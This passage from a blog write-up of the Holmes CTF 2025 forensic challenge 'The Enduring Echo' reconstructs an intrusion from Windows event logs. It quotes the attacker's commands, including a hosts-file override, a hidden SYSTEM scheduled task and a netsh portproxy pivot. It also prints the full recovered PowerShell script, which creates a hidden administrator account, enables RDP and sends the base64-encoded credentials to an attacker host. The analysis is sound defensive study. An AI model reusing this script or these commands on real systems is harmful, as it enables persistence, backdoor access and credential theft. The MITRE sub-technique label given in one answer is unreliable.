<p>The combination of:</p>
</li>
</ol>
<ul>
<li>remote process creation via the WMI provider host,</li>
<li>execution of standard shell commands via cmd.exe, and</li>
<li>output redirection to an ADMIN$ share
strongly points to a WMI-based remote execution technique.</li>
</ul>
<ol start="3">
<li>wmiexec.py (from the Impacket tools) is a well-known utility that performs remote command execution via WMI and produces the exact behavioral pattern: it creates processes on the remote host through WMI (which show up with WmiPrvSE.exe as the parent) and often uses redirection or temporary files to capture command output.</li>
</ol>
<p><strong>Why wmiexec.py (and not other tools)</strong></p>
<ol>
<li>
<p>Behavioral match: wmiexec.py uses the WMI services to spawn processes remotely. When you run wmiexec.py against a target, the remote host will typically show WmiPrvSE.exe as the parent of the spawned cmd.exe process in Event ID 4688 records. That exact parent-child relationship is present in your logs.</p>
</li>
<li>
<p>Simplicity &amp; output handling: wmiexec.py captures stdout/stderr from commands executed remotely. Attackers often redirect outputs to ADMIN$ or other shares as part of their workflow; this is consistent with the 1&gt; \127.0.0.1\ADMIN$__&hellip; 2&gt;&amp;1 redirection we saw.</p>
</li>
<li>
<p>Alternatives considered: Other remote-exec tools (e.g., psexec.py, smbexec, native wmic, winrm, or PowerShell remoting) also cause remote process creation, but:</p>
</li>
</ol>
<ul>
<li>psexec variants typically use the Service Control Manager (showing services.exe/svchost involvement) rather than WmiPrvSE.exe.</li>
<li>wmic may show similar parentage, but wmic is a built-in client and often appears differently in logs and in how output is handled.</li>
<li>PowerShell remoting uses WinRM and different service parents (e.g., winrm.exe/svchost), and often shows powershell.exe command lines including -EncodedCommand.</li>
</ul>
<ol start="4">
<li>Given the concrete evidence (WMI parent process + cmd-based commands + admin-share output capture) the most likely third-party tool used is wmiexec.py. This is a classic and common tool used in red team and attacker toolkits for WMI-based remote execution.</li>
</ol>
<p><strong>Interpretation (attack context)</strong></p>
<ol>
<li>
<p>The attacker used WMI to execute reconnaissance commands (systeminfo) remotely. This is typically an early post-exploitation step to profile the host and confirm access.</p>
</li>
<li>
<p>Using wmiexec.py provides a non-interactive, stealthy channel to run commands without an interactive shell, which reduces noise and leaves a trail primarily in event logs (4688) rather than interactive user logs.</p>
</li>
</ol>
<h2 id="question-4-1">
<a class="header-anchor" href="#question-4-1"></a>
Question 4:
</h2><p>What was the attacker’s IP address? (IPv4 address)</p>
<p><strong>Evidence &amp; where it was found</strong></p>
<p><img src="/images/holmes_2025/the_enduring_echo/anh2.png" alt="Organization Evidence"></p>
<ol>
<li>
<p>I examined the relevant Windows Security Event (Event ID 4688 — A new process has been created).</p>
</li>
<li>
<p>The CommandLine field in that event contains:</p>
</li>
</ol>
<pre tabindex="0"><code class="language-velocity" data-lang="velocity">cmd /C &#34;echo 10.129.242.110 NapoleonsBlackPearl.htb &gt;&gt; C:\Windows\System32\drivers\etc\hosts&#34;
</code></pre><ol start="3">
<li>This command clearly contains the IPv4 address 10.129.242.110 which the attacker wrote into the local hosts file along with the hostname NapoleonsBlackPearl.htb.</li>
</ol>
<p><strong>Interpretation</strong></p>
<ol>
<li>
<p>The attacker executed a simple echo redirection to append a line to the system hosts file. The line being appended maps the hostname NapoleonsBlackPearl.htb to the IP 10.129.242.110.</p>
</li>
<li>
<p>This is a local DNS override technique: by inserting the mapping into C:\Windows\System32\drivers\etc\hosts, the attacker ensures that any process on the host resolving NapoleonsBlackPearl.htb will get 10.129.242.110 instead of using the network DNS.</p>
</li>
<li>
<p>Common motivations for this action:</p>
</li>
</ol>
<ul>
<li>Command-and-control (C2) reachability — forcing the hostname to point to an attacker-controlled IP so malware or scripts can contact it directly.</li>
<li>Credential harvesting / redirecting legitimate services — causing calls to an internal or external named resource to reach an attacker-controlled host.</li>
<li>Phishing / tooling convenience — making it easier to access a lab or named host without DNS changes.</li>
</ul>
<ol start="4">
<li>The technique is low-noise and persistent (survives reboots) until someone edits the hosts file, so it’s often used by attackers to ensure a reliable mapping.</li>
</ol>
<p><strong>Context from other events</strong></p>
<ol>
<li>The parent process for this cmd.exe invocation was C:\Windows\System32\cmd.exe (i.e., a command shell), and earlier events showed WMI (WmiPrvSE.exe) as the creator of shell commands — together these indicate the host was being controlled remotely (likely via wmiexec.py or another WMI-based tool) and used to modify the hosts file.</li>
</ol>
<p><strong>Why this matters</strong></p>
<ol>
<li>
<p>Manipulating the hosts file is a clear sign of attempted environment manipulation by the attacker. Even if the IP 10.129.242.110 is an internal address (the 10. prefix is private), it&rsquo;s important because it shows where the attacker wants traffic to go from the compromised host.</p>
</li>
<li>
<p>If the attacker’s infrastructure resides at that IP (or if it points to another compromised machine), it may be part of lateral movement or an internal rendezvous point for malware.</p>
</li>
</ol>
<p><strong>Conclusion:</strong></p>
<pre tabindex="0"><code class="language-velocity" data-lang="velocity">10.129.242.110
</code></pre><h2 id="question-5-1">
<a class="header-anchor" href="#question-5-1"></a>
Question 5:
</h2><p>What is the first element in the attacker&rsquo;s sequence of persistence mechanisms? (string)</p>
<p><strong>Evidence &amp; where it was found</strong></p>
<p><img src="/images/holmes_2025/the_enduring_echo/anh3.png" alt="Organization Evidence"></p>
<ol>
<li>
<p>I inspected the relevant Windows Security Event (Event ID 4688 — A new process has been created).</p>
</li>
<li>
<p>The CommandLine field shows the attacker created a scheduled task:</p>
</li>
</ol>
<pre tabindex="0"><code class="language-velocity" data-lang="velocity">schtasks /create /tn &#34;SysHelper Update&#34; /tr &#34;powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Users\Werni\Appdata\Local\JM.ps1&#34; /sc minute /mo 2 /ru SYSTEM /f
</code></pre><ol start="3">
<li>
<p>The NewProcessName is C:\Windows\System32\schtasks.exe and the ParentProcessName is C:\Windows\System32\cmd.exe, so the command shell created the scheduled task using schtasks.exe.</p>
</li>
<li>
<p>The task name is explicitly &ldquo;SysHelper Update&rdquo; — this is the persistence artifact name the attacker chose.</p>
</li>
</ol>
<p><strong>Interpretation</strong></p>
<ol>
<li>
<p>The attacker used schtasks.exe to create a scheduled task named SysHelper Update that runs a PowerShell script (JM.ps1) from the user’s AppData folder.</p>
</li>
<li>
<p>Details from the command line:</p>
</li>
</ol>
<ul>
<li>/sc minute /mo 2 — the task is scheduled to run every 2 minutes (very frequent), indicating the attacker wanted a reliably persistent, near-continuous execution.</li>
<li>/ru SYSTEM — the task runs as SYSTEM, giving it high privileges.</li>
<li>ExecutionPolicy Bypass -WindowStyle Hidden — these flags are typical when attackers try to run PowerShell scripts stealthily and avoid execution policy controls.
/f forces creation/overwriting of the task if it exists.</li>
</ul>
<ol start="3">
<li>This scheduled task is a classic persistence technique: it ensures the malicious script is executed repeatedly and with elevated privileges even after reboots or user logoffs.</li>
</ol>
<p><strong>Why this matters</strong></p>
<ol>
<li>
<p>As the first observed persistence element, SysHelper Update likely represents the initial mechanism the attacker installed to maintain access to the host.</p>
</li>
<li>
<p>Because it runs as SYSTEM and executes a script from a user-writable folder (C:\Users\Werni\Appdata\Local\JM.ps1), it provides a highly reliable foothold and a convenient location for the attacker to update or swap the payload.</p>
</li>
<li>
<p>The extremely short interval (every 2 minutes) suggests the attacker intended near-continuous control or wanted rapid re-establishment if their payload was terminated.</p>
</li>
</ol>
<p><strong>Conclusion:</strong></p>
<pre tabindex="0"><code class="language-velocity" data-lang="velocity">SysHelper Update
</code></pre><h2 id="question-6-1">
<a class="header-anchor" href="#question-6-1"></a>
Question 6:
</h2><p>Identify the script executed by the persistence mechanism. (C:\FOLDER\PATH\FILE.ext)</p>
<p>-Similarly, in question 5, the answer is</p>
<p><strong>Conclusion:</strong></p>
<pre tabindex="0"><code class="language-velocity" data-lang="velocity">C:\Users\Werni\Appdata\Local\JM.ps1
</code></pre><h2 id="question-7-1">
<a class="header-anchor" href="#question-7-1"></a>
Question 7:
</h2><p>What local account did the attacker create? (string)</p>
<p><strong>Evidence &amp; where it was found</strong></p>
<ol>
<li>Windows Security log (Event ID 4720 — User Account Created):</li>
</ol>
<ul>
<li>he XML view of the 4720 event shows TargetUserName = svc_netupd. This is a direct event that records the creation of a local user account. The presence of this field is authoritative evidence the account was created on the host.</li>
</ul>
<ol start="2">
<li>Malicious script JM.ps1 (recovered from C:\Users\Werni\AppData\Local\JM.ps1):</li>
</ol>
<ul>
<li>The script contains:</li>
</ul>
<pre tabindex="0"><code class="language-velocity" data-lang="velocity"># List of potential usernames
$usernames = @(&#34;svc_netupd&#34;, &#34;svc_dns&#34;, &#34;sys_helper&#34;, &#34;WinTelemetry&#34;, &#34;UpdaterSvc&#34;)

# Check for existing user
$existing = $usernames | Where-Object {
    Get-LocalUser -Name $_ -ErrorAction SilentlyContinue
}

# If none exist, create a new one
if (-not $existing) {
    $newUser = Get-Random -InputObject $usernames
    $timestamp = (Get-Date).ToString(&#34;yyyyMMddHHmmss&#34;)
    $password = &#34;Watson_$timestamp&#34;

    $securePass = ConvertTo-SecureString $password -AsPlainText -Force

    New-LocalUser -Name $newUser -Password $securePass -FullName &#34;Windows Update Helper&#34; -Description &#34;System-managed service account&#34;
    Add-LocalGroupMember -Group &#34;Administrators&#34; -Member $newUser
    Add-LocalGroupMember -Group &#34;Remote Desktop Users&#34; -Member $newUser

    # Enable RDP
    Set-ItemProperty -Path &#34;HKLM:\System\CurrentControlSet\Control\Terminal Server&#34; -Name &#34;fDenyTSConnections&#34; -Value 0
    Enable-NetFirewallRule -DisplayGroup &#34;Remote Desktop&#34;
    Invoke-WebRequest -Uri &#34;http://NapoleonsBlackPearl.htb/Exchange?data=$([Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(&#34;$newUser|$password&#34;)))&#34; -UseBasicParsing -ErrorAction SilentlyContinue | Out-Null
}
</code></pre><p><img src="/images/holmes_2025/the_enduring_echo/anh3.png" alt="Organization Evidence"></p>
<p>-and logic that checks for existing users and, if none exist, picks one at random:
-That shows the script’s intent: create a user from that list, add it to the Administrators and Remote Desktop Users groups.</p>
<ol start="3">
<li>Correlation</li>
</ol>
<ul>
<li>The scheduled task SysHelper Update (created earlier) runs JM.ps1 every 2 minutes as SYSTEM. That task + the script explain why the user creation event occurred and why svc_netupd (one of the candidate names) was created.</li>
</ul>
<p><strong>Interpretation</strong></p>
<ol>
<li>svc_netupd was created by the attacker as a local service-style account. The script intentionally:</li>
</ol>
<ul>
<li>Generates a randomized password (Watson_<!-- raw HTML omitted -->),</li>
<li>Creates the user with a plausible service name (Windows Update Helper),</li>
<li>Escalates privileges by adding the account to the Administrators group, and</li>
<li>Adds it to Remote Desktop Users and enables RDP, facilitating remote interactive access.</li>
</ul>
<ol start="2">
<li>
<p>The account name svc_netupd is consistent with the script’s naming scheme designed to blend in (service-like names).</p>
</li>
<li>
<p>The attacker also attempts to exfiltrate credentials by encoding the <!-- raw HTML omitted -->|<!-- raw HTML omitted --> pair in Base64 and calling:</p>
</li>
</ol>
<pre tabindex="0"><code class="language-velocity" data-lang="velocity">http://NapoleonsBlackPearl.htb/Exchange?data=&lt;base64&gt;
</code></pre><p>So not only was the account created, its credentials were likely sent to the attacker-controlled host.
<strong>Conclusion:</strong></p>
<pre tabindex="0"><code class="language-velocity" data-lang="velocity">svc_netupd
</code></pre><h2 id="question-8-1">
<a class="header-anchor" href="#question-8-1"></a>
Question 8:
</h2><p>What domain name did the attacker use for credential exfiltration? (domain)</p>
<p><strong>Evidence &amp; where it was found</strong></p>
<ul>
<li>The malicious PowerShell script JM.ps1 recovered from C:\Users\Werni\AppData\Local\JM.ps1 contains this line near the end of the script:</li>
</ul>
<pre tabindex="0"><code class="language-velocity" data-lang="velocity">Invoke-WebRequest -Uri &#34;http://NapoleonsBlackPearl.htb/Exchange?data=$([Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(&#34;$newUser|$password&#34;)))&#34; -UseBasicParsing -ErrorAction SilentlyContinue | Out-Null
</code></pre><ul>
<li>This shows the script explicitly sends the newly created account and password (concatenated as <!-- raw HTML omitted -->|<!-- raw HTML omitted --> and then base64-encoded) to the /Exchange endpoint on the host NapoleonsBlackPearl.htb.</li>
<li>Complementary evidence: an earlier command appended an entry to the hosts file:</li>
</ul>
<pre tabindex="0"><code class="language-velocity" data-lang="velocity">cmd /C &#34;echo 10.129.242.110 NapoleonsBlackPearl.htb &gt;&gt; C:\Windows\System32\drivers\etc\hosts&#34;
</code></pre><p>This maps NapoleonsBlackPearl.htb to 10.129.242.110, ensuring that the HTTP request in the script resolves to that IP.</p>
<p><strong>Interpretation</strong></p>
<ul>
<li>The attacker used NapoleonsBlackPearl.htb as the exfiltration domain. The script builds a base64-encoded payload containing the created username and password and sends it via HTTP to <a href="http://NapoleonsBlackPearl.htb/Exchange">http://NapoleonsBlackPearl.htb/Exchange</a>.</li>
<li>Modifying the local hosts file to point that domain to 10.129.242.110 ensures the request reaches the intended infrastructure even if DNS would not resolve the name normally — a common tactic when using internal lab or private infrastructure.</li>
<li>This pattern (local hosts mapping + HTTP exfiltration) indicates the attacker wanted reliable delivery of credentials to their collection server and likely used that server to harvest credentials and coordinate further activity.</li>
</ul>
<p><strong>Conclusion:</strong></p>
<pre tabindex="0"><code class="language-velocity" data-lang="velocity">NapoleonsBlackPearl.htb
</code></pre><h2 id="question-9-1">
<a class="header-anchor" href="#question-9-1"></a>
Question 9:
</h2><p>What password did the attacker&rsquo;s script generate for the newly created user? (string)</p>
<p><strong>Evidence &amp; where it was found</strong></p>
<p>1 . Malicious script (JM.ps1) — recovered from C:\Users\Werni\AppData\Local\JM.ps1:
The script contains these lines (paraphrased):</p>
<pre tabindex="0"><code class="language-velocity" data-lang="velocity">$timestamp = (Get-Date).ToString(&#34;yyyyMMddHHmmss&#34;)
$password = &#34;Watson_$timestamp&#34;
$securePass = ConvertTo-SecureString $password -AsPlainText -Force
New-LocalUser -Name $newUser -Password $securePass ...
</code></pre><ul>
<li>This shows the password is formed by concatenating the literal Watson_ with a timestamp string in the format yyyyMMddHHmmss.</li>
</ul>
<ol start="2">
<li>Windows Security event timestamp — Event metadata shown in the Event Viewer XML includes:</li>
</ol>
<pre tabindex="0"><code class="language-velocity" data-lang="velocity">&lt;TimeCreated SystemTime=&#34;2025-08-24T23:05:09.7646587Z&#34; /&gt;
&lt;EventData&gt;
  &lt;Data Name=&#34;TargetUserName&#34;&gt;svc_netupd&lt;/Data&gt;
  ...
&lt;/EventData&gt;
</code></pre><ul>
<li>This event corresponds to the account creation (TargetUserName svc_netupd). The SystemTime value is in UTC.</li>
</ul>
<p><img src="/images/holmes_2025/the_enduring_echo/anh5.png" alt="Organization Evidence">
3. Timezone / timestamp adjustment — The forensic view of the host shows the system time zone is Pacific Time (ActiveTimeBias 420), which is UTC−07:00. Converting the UTC event time 2025-08-24T23:05:09Z to local Pacific time gives 2025-08-24 16:05:09. Formatting that local time as yyyyMMddHHmmss produces 20250824160509. Prepending Watson_ yields the final password: Watson_20250824160509.</p>
<p><strong>Conclusion:</strong></p>
<pre tabindex="0"><code class="language-velocity" data-lang="velocity">Watson_20250824160509
</code></pre><h2 id="question-10-1">
<a class="header-anchor" href="#question-10-1"></a>
Question 10:
</h2><p>What was the IP address of the internal system the attacker pivoted to? (IPv4 address)</p>
<p><strong>Evidence &amp; where it was found</strong></p>
<ul>
<li>he Windows Security Event (Event ID 4688 — A new process has been created) shows the attacker executed netsh.exe.</li>
<li>The CommandLine field contains:</li>
</ul>
<pre tabindex="0"><code class="language-velocity" data-lang="velocity">netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9999 connectaddress=192.168.1.101 connectport=22
</code></pre><p><img src="/images/holmes_2025/the_enduring_echo/anh6.png" alt="Organization Evidence"></p>
<ul>
<li>This command explicitly sets up a port forwarding rule that forwards local traffic on port 9999 (listening on all interfaces 0.0.0.0) to 192.168.1.101:22 (SSH on the internal host). The connectaddress=192.168.1.101 value is the pivot target.</li>
</ul>
<p><strong>Interpretation</strong></p>
<ul>
<li>The attacker created a portproxy using netsh to forward traffic from the compromised host to an internal machine at 192.168.1.101. Traffic connecting to the compromised host on port 9999 will be forwarded to port 22 on that internal IP — effectively providing remote access to the internal host via the compromised machine (a common pivoting technique).</li>
<li>listenaddress=0.0.0.0 makes the proxy listen on all network interfaces, so the attacker (or other systems) can reach the forwarded SSH port from anywhere that can reach the compromised host.</li>
<li>Because the forwarded target port is 22 (SSH), the goal was almost certainly to provide remote SSH access to the internal host without direct network access to it — i.e., tunneling/pivoting.</li>
</ul>
<p><strong>Conclusion:</strong></p>
<pre tabindex="0"><code class="language-velocity" data-lang="velocity">192.168.1.101
</code></pre><h2 id="question-11-1">
<a class="header-anchor" href="#question-11-1"></a>
Question 11:
</h2><p>Which TCP port on the victim was forwarded to enable the pivot? (port 0-65565)</p>
<p>-Similarly, in question 10, the answer is
<strong>Conclusion:</strong></p>
<pre tabindex="0"><code class="language-velocity" data-lang="velocity">9999
</code></pre><h2 id="question-12-1">
<a class="header-anchor" href="#question-12-1"></a>
Question 12:
</h2><p>What is the full registry path that stores persistent IPv4→IPv4 TCP listener-to-target mappings? (HKLM......)</p>
<p><strong>Analysis</strong></p>
<ul>
<li>When attackers configure port forwarding on a Windows host using the command:</li>
</ul>
<pre tabindex="0"><code class="language-velocity" data-lang="velocity">netsh interface portproxy add v4tov4 listenport=... listenaddress=... connectport=... connectaddress=...
</code></pre><ul>
<li>these settings are not just temporary. They are saved in the Windows Registry so they survive reboots.</li>
<li>The relevant registry hive is under the Services\PortProxy key. Specifically, for IPv4 → IPv4 TCP forwarding, Windows stores the persistent rules in the following path:</li>
</ul>
<p><strong>Conclusion:</strong></p>
<pre tabindex="0"><code class="language-velocity" data-lang="velocity">HKLM\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4\tcp
</code></pre><h2 id="question-13">
<a class="header-anchor" href="#question-13"></a>
Question 13:
</h2><p>What is the MITRE ATT&amp;CK ID associated with the previous technique used by the attacker to pivot to the internal system? (Txxxx.xxx)</p>
<p><strong>Analysis</strong></p>
<ol>
<li>
<p>From Question 12, we determined the attacker configured persistent port forwarding using the Windows netsh interface portproxy feature. This technique allows them to redirect traffic from one IP/port to another, enabling lateral movement or pivoting into internal systems</p>
</li>
<li>
<p>According to the MITRE ATT&amp;CK framework:</p>
</li>
</ol>
<ul>
<li>The tactic is Defense Evasion / Lateral Movement.</li>
<li>The technique is Proxy: External Proxy.</li>
<li>The specific sub-technique for port forwarding / port proxying is:</li>
</ul>
<p><strong>Conclusion:</strong></p>
<pre tabindex="0"><code class="language-velocity" data-lang="velocity">T1090.001
</code></pre><h2 id="question-14">
<a class="header-anchor" href="#question-14"></a>
Question 14:
</h2><p>Before the attack, the administrator configured Windows to capture command line details in the event logs. What command did they run to achieve this? (command)</p>
<p><strong>Evidence &amp; where it was found</strong></p>
<ul>
<li>In the forensic output (ConsoleHost_history and other collected text artifacts shown in Autopsy), the command appears verbatim among the recorded administrator commands. The extracted text window includes the reg add invocation used to enable command-line capture.</li>
<li>Additional contextual evidence: subsequent security events (Event ID 4688) in the provided logs contain full CommandLine fields for cmd.exe/powershell.exe invocations, showing that command-line auditing was indeed active when the attacker executed commands.
Interpretation</li>
<li>The reg add command writes a DWORD value named ProcessCreationIncludeCmdLine_Enabled with value 1 into the registry path:</li>
</ul>
<pre tabindex="0"><code class="language-velocity" data-lang="velocity">HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit
</code></pre><ul>
<li>Setting this value to 1 enables Windows’ feature to include process command-line information in process creation audit records (4688). In modern Windows versions this is one of the steps required so that the Security log records full command lines for spawned processes.</li>
<li>This change makes process creation events significantly richer — instead of only seeing NewProcessName (the binary path), the CommandLine field will contain the exact arguments and commands executed. That is exactly how you were able to see the attacker’s full command lines (for example, the echo &hellip; &raquo; hosts line, netsh interface portproxy and the scheduled task creation).
Why this matters</li>
<li>From a defensive perspective, enabling command-line auditing is highly valuable — it transforms event logs from coarse indicators into actionable forensic evidence. In this case
it allowed investigators to identify attacker TTPs (WMI remote execution, scheduled tasks, hosts file manipulation, portproxy pivoting) with concrete command strings and arguments.</li>
<li>From an operational perspective, organizations should balance the value of detailed logging with storage and privacy considerations (command lines can include sensitive data). The registry change is a deliberate, system-level switch and should be documented and monitored.</li>
<li>Attackers are less likely to hide their behavior when command-line logging is enabled — it makes post-compromise detection and attribution much easier.</li>
</ul>
<p><img src="/images/holmes_2025/the_enduring_echo/anh7.png" alt="Organization Evidence"></p>
<p><strong>Conclusion:</strong></p>
<pre tabindex="0"><code class="language-velocity" data-lang="velocity">reg add &#34;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit&#34; /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1
</code></pre></div>
    <footer class="article-footer"><ul class="article-tag-list" itemprop="keywords"></ul>
</footer>
  </div></article></section>
        </div><footer id="footer">
  <div style="width: 100%; overflow: hidden">
    <div class="footer-line"></div>
  </div>
  <div id="footer-info"><div>
      <span class="icon-copyright"></span>2020-2025<span class="footer-info-sep rotate"></span>
      Diep Manh Tuan
    </div><div>
        Powered by&nbsp;<a
          href="https://gohugo.io/"
          target="_blank"
          >Hugo</a
        >&nbsp; Theme.<a
          href="https://github.com/D-Sketon/hugo-theme-reimu"
          target="_blank"
          >Reimu</a
        >
      </div><div>
        <span class="icon-brush"
          >&nbsp;4.4k</span
        >
        &nbsp;|&nbsp;
        <span class="icon-coffee">&nbsp;00:21</span>
      </div><div>
        <span class="icon-eye"></span>
        <span id="busuanzi_container_site_pv"
          >Number of visits&nbsp;<span
            id="busuanzi_value_site_pv"
          ></span
        ></span>
        &nbsp;|&nbsp;
        <span class="icon-user"></span>
        <span id="busuanzi_container_site_uv"
          >Number of visitors&nbsp;<span
            id="busuanzi_value_site_uv"
          ></span
        ></span>
      </div></div>
</footer>
<div class="sidebar-top">
            <div class="sidebar-top-taichi rotate"></div>
            <div class="arrow-up"></div>
          </div><div id="mask" class="hide"></div>
      </div><nav id="mobile-nav">
  <div class="sidebar-wrap"><div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
<div class="sidebar-toc-wrapper toc-div-class">
  <nav id="TableOfContents">
  <ul>
    <li><a href="#holmes-ctf-2025--the-card">Holmes CTF 2025 – The Card</a></li>
    <li><a href="#holmes-ctf-2025--the-enduring-echo">Holmes CTF 2025 – The Enduring Echo</a></li>
  </ul>
</nav>
</div></div>
        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
  <img
    data-src="/avatar/images/tuan.jpg"
    data-sizes="auto"
    alt="Diep Manh Tuan"
    class="lazyload"
  />
  <div class="sidebar-author-name">Diep Manh Tuan</div>
  <div class="sidebar-description">Digital Forensics | @VSL.0utl4w</div>
</div>
<div class="sidebar-state">
  <div class="sidebar-state-article">
    <div>Posts</div><div class="sidebar-state-number">1</div>
  </div>
  <a class="sidebar-state-category" href="/categories/" aria-label="sidebar-state-category-link">
    <div>Categories</div>
    <div class="sidebar-state-number">
      2
    </div>
  </a>
  <a class="sidebar-state-tag" href="/tags/" aria-label="sidebar-state-tag-link">
    <div>Tags</div>
    <div class="sidebar-state-number">0</div>
  </a>
</div>
<div class="sidebar-social"></div>
<div class="sidebar-menu"><div class="sidebar-menu-link-wrap">
      <a
        class="sidebar-menu-link-dummy"
        href="/"
        aria-label="Home"
      ></a>
      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
      <div class="sidebar-menu-link">Home</div>
    </div><div class="sidebar-menu-link-wrap">
      <a
        class="sidebar-menu-link-dummy"
        href="/archives"
        aria-label="Archives"
      ></a>
      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
      <div class="sidebar-menu-link">Archives</div>
    </div><div class="sidebar-menu-link-wrap">
      <a
        class="sidebar-menu-link-dummy"
        href="/about"
        aria-label="About"
      ></a>
      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
      <div class="sidebar-menu-link">About</div>
    </div><div class="sidebar-menu-link-wrap">
      <a
        class="sidebar-menu-link-dummy"
        href="/friend"
        aria-label="Friend"
      ></a>
      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
      <div class="sidebar-menu-link">Friend</div>
    </div></div>
</div></div><div class="sidebar-btn-wrapper">
        <div class="sidebar-toc-btn current"></div>
        <div class="sidebar-common-btn"></div>
      </div></nav>
</div><script
    src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"
    integrity="sha384-3gT/vsepWkfz/ff7PpWNUeMzeWoH3cDhm/A8jM7ouoAK0/fP/9bcHHR5kHq2nf&#43;e" crossorigin="anonymous"></script><script
    src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js"
    integrity="sha384-J08i8An/QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script><script src="/js/main.js" integrity="" crossorigin="anonymous" ></script><script src="/js/aos.js" integrity="" crossorigin="anonymous" ></script><script>
    var aosInit = () => {
      AOS.init({
        duration: 1000,
        easing: "ease",
        once: true,
        offset: 50,
      });
    };
    if (document.readyState === "loading") {
      document.addEventListener("DOMContentLoaded", aosInit);
    } else {
      aosInit();
    }
  </script><script src="/js/pjax_main.js" integrity="" crossorigin="anonymous" data-pjax></script><script
    src="https://npm.webcache.cn/mouse-firework@0.1.1/dist/index.umd.js"
    integrity="sha384-8LyaidD9GPxQQgLJO/WRw/O2h3BoNq/ApI/ecpvM6RsrCz2qP2ppBXUKihP4V/2d" crossorigin="anonymous"></script><script>
  if (window.firework) {
    const options = JSON.parse("{\"excludeelements\":[\"a\",\"button\"],\"particles\":[{\"colors\":[\"var(--red-1)\",\"var(--red-2)\",\"var(--red-3)\",\"var(--red-4)\"],\"duration\":[1200,1800],\"easing\":\"easeOutExpo\",\"move\":[\"emit\"],\"number\":20,\"shape\":\"circle\",\"shapeOptions\":{\"alpha\":[0.3,0.5],\"radius\":[16,32]}},{\"colors\":[\"var(--red-0)\"],\"duration\":[1200,1800],\"easing\":\"easeOutExpo\",\"move\":[\"diffuse\"],\"number\":1,\"shape\":\"circle\",\"shapeOptions\":{\"alpha\":[0.2,0.5],\"lineWidth\":6,\"radius\":20}}]}");
    options.excludeElements = options.excludeelements;
    delete options.excludeelements;
    window.firework(options);
  }
</script>

<div id="lazy-script">
  <div><script data-pjax>
        window.REIMU_POST = {
          author: "Diep Manh Tuan",
          title: "Holmes CTF 2025 - The Card",
          url: "https:\/\/tu4nsecc.github.io\/posts\/holmes-ctf-2025\/",
          description: "\rHolmes CTF 2025 – The Card\rHolmes CTF 2025 Event Link: https:\/\/ctf.hackthebox.com\/event\/2536\nChallenge name: The Card\nDifficulty: Easy\nDescribe: Holmes receives a breadcrumb from Dr. Nicole Vale – fragments from a string of cyber incidents across Cogwork-1. Each lead ends the same way: a digital …",
          cover: "https:\/\/tu4nsecc.github.io\/images\/holmes_2025\/the_card\/anh1.png",
        };
      </script><script src="/js/insert_highlight.js" integrity="" crossorigin="anonymous" data-pjax></script><script type="module" data-pjax>const PhotoSwipeLightbox = (await safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js", "sha384-DiL6M\/gG\u002bwmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF\/N6lrZi\/")).default;const pswp = () => {
          if (_$$('.article-entry a.article-gallery-item').length > 0) {
            new PhotoSwipeLightbox({
              gallery: '.article-entry',
              children: 'a.article-gallery-item',pswpModule: () => safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8\u002boTJ7m3DfYEWX1fu1scuS4\u002bs")}).init();
          }
          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
            new PhotoSwipeLightbox({
              gallery: '.article-gallery',
              children: 'a.article-gallery-item',pswpModule: () => safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8\u002boTJ7m3DfYEWX1fu1scuS4\u002bs")}).init();
          }
          window.lightboxStatus = 'done';
          window.removeEventListener('lightbox:ready', pswp);
        }
        if(window.lightboxStatus === 'ready') {
          pswp()
        } else {
          window.addEventListener('lightbox:ready', pswp);
        }
      </script></div>
</div><script
    src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js"
    asyncintegrity="sha384-0M75wtSkhjIInv4coYlaJU83&#43;OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id&#43;S" crossorigin="anonymous"></script><script>
    if ('serviceWorker' in navigator) {
      navigator.serviceWorker.getRegistrations().then((registrations) => {
        for (let registration of registrations) {
          registration.unregister();
        }
      });
    }
  </script><script>
  const reimuCopyright = String.raw`
   ______     ______     __     __    __     __  __    
  /\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
  \ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
   \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
    \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
                                                    
  `;
  console.log(String.raw`%c ${reimuCopyright}`, "color: #ff5252;");
  console.log(
    "%c Theme.Reimu" + " %c https://github.com/D-Sketon/hugo-theme-reimu ",
    "color: white; background: #ff5252; padding:5px 0;",
    "padding:4px;border:1px solid #ff5252;",
  );
</script></body>
</html>
